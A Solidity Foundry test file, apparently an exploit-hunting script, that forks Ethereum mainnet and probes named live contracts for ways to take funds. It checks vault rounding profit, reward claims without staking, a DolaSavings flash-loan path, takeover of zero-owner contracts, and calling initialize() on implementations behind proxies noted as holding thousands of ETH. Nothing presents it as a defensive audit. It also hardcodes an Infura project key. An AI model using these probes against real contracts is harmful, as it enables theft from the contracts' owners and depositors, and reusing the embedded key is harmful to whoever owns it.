// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface IVault {
    function deposit(uint256 assets, address receiver) external returns (uint256);
    function withdraw(uint256 assets, address receiver, address owner) external returns (uint256);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256);
    function totalAssets() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function previewDeposit(uint256) external view returns (uint256);
    function previewWithdraw(uint256) external view returns (uint256);
    function convertToShares(uint256) external view returns (uint256);
    function convertToAssets(uint256) external view returns (uint256);
    function asset() external view returns (address);
}

contract ComprehensiveExploitTest is Test {

    function setUp() public {
        vm.createSelectFork("https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c");
    }

    // Test: Can we profit from vault rounding?
    function test_vaultRounding() public {
        address vault = vm.parseAddress("0xcf5ea1b38380f6af39068375516daf40ed70d299");

        console.log("=== VAULT ROUNDING TEST ===");
        console.log("Vault:", vault);
        console.log("Balance (ETH):", vault.balance / 1e18);

        // Get min deposit
        (bool s, bytes memory d) = vault.staticcall(
            abi.encodeWithSignature("minDeposit()")
        );
        if (s && d.length >= 32) {
            uint256 minDep = abi.decode(d, (uint256));
            console.log("minDeposit:", minDep);
        }

        // Calculate rounding at different amounts
        IVault v = IVault(vault);

        console.log("previewDeposit(1):", v.previewDeposit(1));
        console.log("previewDeposit(1000):", v.previewDeposit(1000));
        console.log("convertToShares(1):", v.convertToShares(1));
        console.log("convertToAssets(1):", v.convertToAssets(1));
    }

    // Test: Can we claim rewards from staking contract without staking?
    function test_stakingRewardCapture() public {
        address[3] memory stakingContracts = [
            vm.parseAddress("0x9040e41eF5E8b281535a96D9a48aCb8cfaBD9a48"),
            vm.parseAddress("0x21d6ec8fc14caacc55afa23cba66798dab3a0ec0"),
            vm.parseAddress("0x9ba021b0a9b958b5e75ce9f6dff97c7ee52cb3e6")
        ];

        address attacker = address(0xBEEF);

        for (uint i = 0; i < stakingContracts.length; i++) {
            address target = stakingContracts[i];
            console.log("");
            console.log("=== Testing staking contract ===");
            console.log(target);

            // Check reward rate
            (bool s, bytes memory d) = target.staticcall(
                abi.encodeWithSignature("rewardRate()")
            );
            if (s && d.length >= 32) {
                console.log("rewardRate:", abi.decode(d, (uint256)));
            }

            // Check if attacker has earned anything
            (s, d) = target.staticcall(
                abi.encodeWithSignature("earned(address)", attacker)
            );
            if (s && d.length >= 32) {
                console.log("earned(attacker):", abi.decode(d, (uint256)));
            }

            // Try to get rewards without stake
            vm.startPrank(attacker);
            (s,) = target.call(abi.encodeWithSignature("getReward()"));
            console.log("getReward():", s ? "SUCCESS" : "FAILED");
            vm.stopPrank();
        }
    }

    // Test: Flash loan attack on DolaSavings
    function test_dolaSavingsFlash() public {
        address dolaSavings = vm.parseAddress("0xE5f24791E273Cb96A1f8E5B67Bc2397F0AD9B8B4");
        address dbr = vm.parseAddress("0xAD038Eb671c44b853887A7E32528FaB35dC5D710");

        address attacker = address(0xBEEF);

        console.log("=== DOLASAVINGS FLASH TEST ===");

        // Check DBR balance in contract
        uint256 dbrBal = IERC20(dbr).balanceOf(dolaSavings);
        console.log("DBR in DolaSavings:", dbrBal);

        if (dbrBal == 0) {
            console.log("No DBR to capture - flash attack NOT viable");
            return;
        }

        // Check claimable for attacker (should be 0)
        (bool s, bytes memory d) = dolaSavings.staticcall(
            abi.encodeWithSignature("claimable(address)", attacker)
        );
        if (s && d.length >= 32) {
            console.log("claimable(attacker):", abi.decode(d, (uint256)));
        }
    }

    // Test: Check for owner = 0 contracts that can be taken over
    function test_ownerlessContracts() public {
        address[5] memory targets = [
            vm.parseAddress("0x38778e6dB1A915d2f2f8fF5D0d34f0c0DCa58787"),
            vm.parseAddress("0x9fdeea19836a413c04e9672d3d09f482278e863c"),
            vm.parseAddress("0x639f2aece398aa76b07e59ef6abe2cfe32bacb68"),
            vm.parseAddress("0x1d59bc9fce6b8e2b1bf86d4777289ffd83d24c99"),
            vm.parseAddress("0xedfb1ed6e90b25787f6ac25d1bcf79da0e7fb07f")
        ];

        address attacker = address(0xBEEF);

        for (uint i = 0; i < targets.length; i++) {
            address target = targets[i];
            console.log("");
            console.log("=== Target ===");
            console.log(target);
            console.log("Balance (ETH):", target.balance / 1e18);

            // Check owner
            (bool s, bytes memory d) = target.staticcall(
                abi.encodeWithSignature("owner()")
            );
            if (s && d.length >= 32) {
                address owner = abi.decode(d, (address));
                console.log("owner:", owner);

                if (owner == address(0)) {
                    console.log("!!! ZERO OWNER - TESTING TAKEOVER");

                    vm.startPrank(attacker);

                    (s,) = target.call(abi.encodeWithSignature("claimOwnership()"));
                    console.log("claimOwnership:", s ? "SUCCESS" : "FAILED");

                    (s,) = target.call(abi.encodeWithSignature("acceptOwnership()"));
                    console.log("acceptOwnership:", s ? "SUCCESS" : "FAILED");

                    vm.stopPrank();
                }
            } else {
                console.log("No owner() function");

                // Check admin
                (s, d) = target.staticcall(abi.encodeWithSignature("admin()"));
                if (s && d.length >= 32) {
                    console.log("admin:", abi.decode(d, (address)));
                }
            }
        }
    }

    // Test: High-value proxy implementations
    function test_proxyImplementations() public {
        address[4] memory proxies = [
            vm.parseAddress("0x5efc9d10e42fb517456f4ac41eb5e2ebe42c8918"), // 12,683 ETH
            vm.parseAddress("0x651f1d419c548125d7e5456fb61f3df47c29600d"), // 23,264 ETH
            vm.parseAddress("0x0669bcdc8ede4a973ed9b3480aff984de15d2d65"), // 23,262 ETH
            vm.parseAddress("0x4fdc295580287b1e3c8fa8875f0fbdc688d8e8a5")  // 1,794 ETH
        ];

        bytes32 implSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

        for (uint i = 0; i < proxies.length; i++) {
            address proxy = proxies[i];
            console.log("");
            console.log("=== Proxy ===");
            console.log(proxy);
            console.log("Balance (ETH):", proxy.balance / 1e18);

            // Get implementation
            bytes32 implBytes = vm.load(proxy, implSlot);
            address impl = address(uint160(uint256(implBytes)));
            console.log("Implementation:", impl);

            // Check implementation slot 0
            bytes32 implSlot0 = vm.load(impl, bytes32(0));
            console.log("Impl slot 0:", uint256(implSlot0));

            // Try initialize on implementation
            (bool s,) = impl.call(abi.encodeWithSignature("initialize()"));
            console.log("initialize() on impl:", s ? "SUCCESS!!!" : "failed (expected)");
        }
    }
}
